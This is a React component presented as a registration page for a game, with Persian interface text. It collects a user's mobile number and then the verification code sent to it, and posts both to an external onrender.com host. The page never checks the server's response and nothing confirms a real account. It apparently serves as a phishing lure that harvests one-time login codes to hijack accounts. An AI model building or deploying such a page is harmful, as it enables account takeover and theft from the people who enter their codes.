import { useState } from "react";

export default function Register() {
  const [step, setStep] = useState(1);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [userId, setUserId] = useState("");

  const sendPhone = async () => {
    if (!/^09\d{9}$/.test(phone)) {
      alert("شماره درست نیست");
      return;
    }

    const res = await fetch("https://khafan-site.onrender.com/phone", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone }),
    });

    const data = await res.json();
    setUserId(data.id);
    setStep(2);
  };

  const sendCode = async () => {
    await fetch(`https://khafan-site.onrender.com/code/${userId}`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code }),
    });

    alert("اوکی شد 🔥");
  };

  return (
    <div className="page">
      <div className="card">

        <img
          src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
          className="img"
        />

        <h2>ورود به بازی</h2>

        {step === 1 && (
          <>
            <input
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="09xxxxxxxxx"
            />
            <button onClick={sendPhone}>ثبت نام</button>
          </>
        )}

        {step === 2 && (
          <>
            <input
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="کد تایید"
            />
            <button onClick={sendCode}>تایید</button>
          </>
        )}
      </div>
    </div>
  );
}